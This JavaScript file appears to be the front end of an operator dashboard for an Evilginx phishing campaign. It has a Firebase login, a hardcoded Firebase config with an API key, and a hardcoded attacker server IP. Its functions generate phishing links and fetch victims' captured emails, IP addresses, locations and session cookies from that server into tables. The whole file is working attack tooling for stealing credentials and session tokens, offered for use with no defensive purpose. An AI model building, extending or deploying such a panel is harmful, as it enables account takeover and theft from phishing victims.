console.log("✅ Script.js loaded successfully");

// ✅ Firebase Configuration (Update with your actual Firebase credentials)
const firebaseConfig = {
    apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
    authDomain: "panel-auth-134b7.firebaseapp.com",
    projectId: "panel-auth-134b7",
    storageBucket: "panel-auth-134b7.firebasestorage.app",
    messagingSenderId: "892746068340",
    appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
};

// ✅ Initialize Firebase
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();

// ✅ Evilginx Server Configuration (DO NOT REMOVE)
const EVILGINX_SERVER = "http://3.149.242.245"; // Update this

// ✅ Ensure event listeners are added
document.addEventListener("DOMContentLoaded", function () {
    console.log("✅ DOM fully loaded");

    const loginBtn = document.getElementById("loginBtn");
    if (loginBtn) {
        loginBtn.addEventListener("click", login);
    }

    const logoutBtn = document.getElementById("logoutBtn");
    if (logoutBtn) {
        logoutBtn.addEventListener("click", logout);
    }

    const generateLinkBtn = document.getElementById("generateLinkBtn");
    if (generateLinkBtn) {
        generateLinkBtn.addEventListener("click", generatePhishingLink);
    }

    const fetchSessionsBtn = document.getElementById("fetchSessionsBtn");
    if (fetchSessionsBtn) {
        fetchSessionsBtn.addEventListener("click", fetchCapturedSessions);
    }

    const fetchCookiesBtn = document.getElementById("fetchCookiesBtn");
    if (fetchCookiesBtn) {
        fetchCookiesBtn.addEventListener("click", fetchCapturedCookies);
    }
});

// 🔹 LOGIN FUNCTION (Fixed)
function login() {
    console.log("🔹 Login function triggered");

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    if (!email || !password) {
        alert("❌ Please enter email and password.");
        return;
    }

    auth.signInWithEmailAndPassword(email, password)
        .then(() => {
            console.log("✅ Login successful, redirecting to dashboard...");
            window.location.href = "dashboard.html"; // ✅ Redirect to dashboard
        })
        .catch(error => {
            console.error("❌ Login error:", error);
            alert("❌ Login failed: " + error.message);
        });
}

// 🔹 LOGOUT FUNCTION
function logout() {
    auth.signOut().then(() => {
        console.log("✅ Logout successful, redirecting to login...");
        window.location.href = "index.html";
    });
}

// 🔹 GENERATE EVILGINX PHISHING LINK
function generatePhishingLink() {
    fetch(`${EVILGINX_SERVER}/generate_link`)
        .then(response => response.json())
        .then(data => {
            document.getElementById("generatedLink").textContent = data.link;
            console.log("✅ Phishing link generated:", data.link);
        })
        .catch(error => console.error("❌ Error generating link:", error));
}

// 🔹 FETCH CAPTURED SESSIONS
function fetchCapturedSessions() {
    fetch(`${EVILGINX_SERVER}/captured_sessions`)
        .then(response => response.json())
        .then(data => {
            let table = document.getElementById("capturedSessionsTable");
            table.innerHTML = "<tr><th>Email</th><th>IP</th><th>Location</th><th>Time</th></tr>";
            data.sessions.forEach(session => {
                table.innerHTML += `<tr><td>${session.email}</td><td>${session.ip}</td><td>${session.location}</td><td>${session.time}</td></tr>`;
            });
            console.log("✅ Captured sessions loaded.");
        })
        .catch(error => console.error("❌ Error fetching sessions:", error));
}

// 🔹 FETCH CAPTURED COOKIES
function fetchCapturedCookies() {
    fetch(`${EVILGINX_SERVER}/captured_cookies`)
        .then(response => response.json())
        .then(data => {
            let table = document.getElementById("cookiesTable");
            table.innerHTML = "<tr><th>Session ID</th><th>Cookie Data</th></tr>";
            data.cookies.forEach(cookie => {
                table.innerHTML += `<tr><td>${cookie.session_id}</td><td>${cookie.data}</td></tr>`;
            });
            console.log("✅ Captured cookies loaded.");
        })
        .catch(error => console.error("❌ Error fetching cookies:", error));
}
